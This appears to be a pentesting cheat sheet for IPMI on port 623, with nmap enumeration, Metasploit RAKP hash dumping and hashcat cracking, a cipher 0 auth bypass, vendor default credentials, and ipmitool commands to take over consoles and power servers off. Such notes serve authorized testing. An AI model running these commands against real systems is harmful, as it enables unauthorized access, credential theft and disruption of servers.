# Port 623 - IPMI

## Table of Contents
- [Enumeration](#enumeration)
  - [Nmap Scripts](#nmap-scripts)
  - [Metasploit](#metasploit)
- [Exploitation](#exploitation)
  - [IPMI Authentication Bypass](#ipmi-authentication-bypass)
  - [IPMI Hash Dumping](#ipmi-hash-dumping)
- [Default Credentials](#default-credentials)

---

## Enumeration

### Quick Check (One-liner)

```shell
# Nmap IPMI scripts
nmap -p 623 -sU --script "ipmi-*" $rhost
```

---

## Exploitation (One-liner)

### IPMI Hash Dumping (RAKP Vulnerability)

```shell
# Metasploit dump + crack
msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS $rhost; set OUTPUT_HASHCAT_FILE ipmi.txt; run; exit" && hashcat -m 7300 ipmi.txt /usr/share/wordlists/rockyou.txt
```

### ipmitool Commands

```shell
# List users
ipmitool -I lanplus -H $rhost -U admin -P password user list

# Get system info
ipmitool -I lanplus -H $rhost -U admin -P password mc info
```

---

## Default Credentials

| Vendor | Username | Password |
|--------|----------|----------|
| Dell iDRAC | root | calvin |
| HP iLO | Administrator | <random 8 chars> |
| Supermicro IPMI | ADMIN | ADMIN |
| IBM IMM | USERID | PASSW0RD |
| Fujitsu iRMC | admin | admin |
| Cisco CIMC | admin | password |

---

## Post-Exploitation

### Access Management Interface

> After obtaining credentials, access the web interface

```shell
# Web interface usually on HTTPS
https://$rhost

# Or dedicated management port
https://$rhost:443
https://$rhost:8443
```

### Remote Console Access

```shell
# Using ipmitool for console
ipmitool -I lanplus -H $rhost -U admin -P password sol activate

# Power management
ipmitool -I lanplus -H $rhost -U admin -P password power status
ipmitool -I lanplus -H $rhost -U admin -P password power on
ipmitool -I lanplus -H $rhost -U admin -P password power off
ipmitool -I lanplus -H $rhost -U admin -P password power reset
```

### System Information

```shell
# Get system info
ipmitool -I lanplus -H $rhost -U admin -P password fru print

# Get sensor data
ipmitool -I lanplus -H $rhost -U admin -P password sensor list

# Get event log
ipmitool -I lanplus -H $rhost -U admin -P password sel list
```

---

## Known Vulnerabilities

### CVE-2013-4786 - IPMI 2.0 RAKP

- Allows retrieval of password hashes without authentication
- Affects almost all IPMI 2.0 implementations
- Use Metasploit `ipmi_dumphashes` module

### Cipher 0 Authentication Bypass

```shell
# Some implementations allow cipher 0 (no auth)
ipmitool -I lanplus -H $rhost -U admin -P "" -C 0 user list
```

---

## Security Notes

> IPMI is often overlooked in security audits but provides:
> - Full hardware access
> - Virtual console (KVM)
> - Virtual media (boot from attacker-controlled ISO)
> - Power control
> - Potential access to host OS credentials
